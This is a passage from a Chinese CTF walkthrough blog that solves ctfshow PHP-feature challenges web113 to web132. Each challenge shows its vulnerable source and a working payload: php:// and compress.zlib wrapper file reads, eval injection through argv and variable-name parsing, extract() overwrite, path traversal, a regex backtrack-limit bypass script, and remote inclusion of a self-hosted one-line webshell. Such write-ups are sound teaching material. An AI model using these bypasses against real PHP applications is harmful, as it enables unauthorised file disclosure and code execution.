<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>在上一题基础上过滤了filter，那我们换另一个协议，使用压缩流zlib://<br>
官方php文档地址：<a href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a><br>
所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web114"><a class="header-anchor" href="#web114">¶</a>web114</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这次把compress过滤了，但没过滤filter，和web112一样的做法，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web115"><a class="header-anchor" href="#web115">¶</a>web115</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$num</span>)</span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里用了is_numeric来判断是不是数字，并且if条件里规定trim($num)移除字符串两侧的字符不能等于36，但后面的if需要等于36才能输出flag，而且自定义函数filter也把16进制和8进制等等封死了，我们写个脚本看看有什么字符可以利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">128</span>; $i++) &#123;</span><br><span class="line">    $a = chr($i) . <span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (trim($a) !== <span class="string">&#x27;36&#x27;</span> &amp;&amp; is_numeric($a)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr($i)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>%0C</code>，也就是<code>\f</code>分页符可以利用，不会被trim过滤掉，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;%0c36</span><br></pre></td></tr></table></figure>
<h3 id="web123"><a class="header-anchor" href="#web123">¶</a>web123</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>看到后面有个eval()函数会执行<code>$c</code>，所以我们就关注$c和if判断需要的两个post即可<br>
在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有<code>空格、+、[</code>则会被转化为<code>_</code>，所以按理来说我们构造不出<code>CTF_SHOW.COM</code>这个变量(因为含有<code>.</code>)，但php中有个特性就是如果传入<code>[</code>，它被转化为<code>_</code>之后，后面的字符就会被保留下来不会被替换，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post：</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</span><br></pre></td></tr></table></figure>
<h3 id="web125"><a class="header-anchor" href="#web125">¶</a>web125</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上一题基础上过滤了flag和echo关键字，我们可以用highlight_file来显示文件，因为flag被在post中被ban了，我们通过get来传参，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?dotast&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;highlight_file($_GET[dotast])</span><br></pre></td></tr></table></figure>
<h3 id="web126"><a class="header-anchor" href="#web126">¶</a>web126</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, $c) &amp;&amp; strlen($c)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这次正则匹配了一些关键字母，导致不能继续用上题payload；观察到这里是有<code>$_SERVER['argv']</code></p>
<blockquote>
<p><code>$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']</code><br>
query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据</p>
</blockquote>
<p>这里进行了本地测试，注意需要在php.ini开启register_argc_argv配置项，测试代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web126/3%29X%28T_JR3%60AOE%25FJON%7D%5D%7BX2.png" alt=""></p>
<p>所以如果我们get传入变量赋值语句，接着在post里面来执行这个赋值语句就可以完美绕过，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?$fl0g&#x3D;flag_give_me;</span><br><span class="line"></span><br><span class="line">post：</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure>
<h3 id="web127"><a class="header-anchor" href="#web127">¶</a>web127</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里开启了<code>$_SERVER['QUERY_STRING']</code>，上题已经解释过，这里用了一个extract()函数</p>
<blockquote>
<p><strong>extract()</strong> 函数从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值</p>
</blockquote>
<p>举例就是<code>?a=2</code>，就会变成<code>$a=2</code>，这里<code>ctf_show</code>有个<code>_</code>需要构造，前面说过php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有<code>空格、+、[</code>则会被转化为<code>_</code>，这里空格没有被ban，所以我们就使用空格，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ctf show&#x3D;ilove36d</span><br></pre></td></tr></table></figure>
<h3 id="web128"><a class="header-anchor" href="#web128">¶</a>web128</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这里嵌套了两层的call_user_func，关于call_user_func函数在前面的题中已经讲过，不过我们可以再回顾一下，同时介绍新的知识点</p>
<blockquote>
<p><strong>call_user_func()</strong> 函数把第一个参数作为回调函数，其余参数都是回调函数的参数</p>
</blockquote>
<p>这里对<code>$f1</code>进行了正则过滤，不能为数字和字母，这里可以使用gettext拓展，开启此拓展<code>_() 等效于 gettext()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;ctfshownb&quot;</span>);</span><br><span class="line"><span class="comment">//输出结果：ctfshownb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;ctfshownb&quot;</span>);</span><br><span class="line"><span class="comment">//输出结果：ctfshownb</span></span><br></pre></td></tr></table></figure>
<p>因此<code>call_user_func('_','ctfshownb')</code> 返回的结果为ctfshownb，接下来到第二层<code>call_user_func</code>，找了一圈发现<code>get_defined_vars</code>函数可以使用</p>
<blockquote>
<p><strong>get_defined_vars ( void ) : array</strong> 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
</blockquote>
<p>所以payload也就出来了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</span><br></pre></td></tr></table></figure>
<p>整个执行流程就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">var_dump(call_user_func(call_user_func(_,&#39;get_defined_vars&#39;)));</span><br><span class="line">var_dump(call_user_func(get_defined_vars));&#x2F;&#x2F;输出数组</span><br></pre></td></tr></table></figure>
<h3 id="web129"><a class="header-anchor" href="#web129">¶</a>web129</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>倒是变得简单了，传入get参数f，并且字符串中包含ctfshow就会读取文件，所以有多种利用姿势，这里讲几种<br>
<strong>第一种</strong><br>
直接文件包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>然后右键源码查看flag<br>
<strong>第二种</strong><br>
远程文件包含，在自己的服务器上写一句话木马进行利用，url为你的服务器ip或者域名，xxxx.txt为你写的一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;http:&#x2F;&#x2F;url&#x2F;xxxx.txt?ctfshow</span><br></pre></td></tr></table></figure>
<p><strong>第三种</strong><br>
使用php伪协议读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web130"><a class="header-anchor" href="#web130">¶</a>web130</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>额，这题直接就ctfshow就过了，因为正则模式匹配不到，然后<code>stripos()</code>搜索字符串返回的值是0(因为ctfshow第一次出现的位置就是0下标)也跳过了if里的语句直接输出flag，所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">f&#x3D;ctfshow</span><br></pre></td></tr></table></figure>
<p>但还是讲一下这题本来的考点，提示very应该考的是正则的最大回溯</p>
<blockquote>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>
回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false</p>
</blockquote>
<p>写一个脚本来发包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/27 17:52</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;dotast&#x27;</span>*<span class="number">170000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<h3 id="web131"><a class="header-anchor" href="#web131">¶</a>web131</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这次加了string函数，用上题脚本改一下就可以，一样利用正则的回溯次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/27 17:52</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b9aa879-e1b7-4f83-9c38-ea3132ac969b.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;dotast&#x27;</span>*<span class="number">170000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>运行脚本即可得到flag</p>
<h3 id="web132"><a class="header-anchor" href="#web132">¶</a>web132</h3>
<p>打开是一个唬人的网页<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/VB1O0E%5D4QT%7DGFT84LA46C4V.png" alt=""><br>
在robots.txt里看到提示admin<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/BHY24X%7D%7B8UE3%25KI9%29%7BHIC%7D7.png" alt=""><br>
访问后看到源码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/2PD47HLQ_YS5_%29MS%7BY18%25%25R.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $username = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $code = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>三个get参数，并且有个if判断条件；php运算符优先级 <code>||</code>优先级低于<code>&amp;&amp;</code>，看个简单例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;   <span class="comment">//也就是(flase || true)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">667</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出结果：666</span></span><br></pre></td></tr></table></figure>
<p>逻辑也很好理解，所以我们只需要满足<code>username=admin</code>过第一个if条件，<code>code=admin</code>满足第二个if条件即可，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;code&#x3D;admin&amp;password&#x3D;dotast</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/%24V_8VKNGG6%5DXJ%5BO2%40NV%7D9%60G.png" alt=""></p>
<h3 id="web133"><a class="header-anchor" href="#web133">¶</a>web133</h3>
